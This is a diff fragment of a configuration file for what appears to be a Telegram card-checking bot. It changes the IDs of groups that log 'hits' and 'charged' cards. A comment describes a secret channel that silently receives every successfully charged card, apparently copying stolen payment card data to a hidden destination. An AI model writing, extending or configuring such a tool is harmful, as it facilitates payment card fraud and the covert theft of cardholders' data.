@@ -92,8 +92,8 @@ API_URL       = "https://lucifer.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
-HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
-EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
+HIT_LOG_GROUP_ID       = -1004329967819   # public hit log group
+EXTRA_CHARGED_GROUP_ID = -0  # extra charged log
 
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
 SECRET_CHANNEL_ID   = -1003968669478
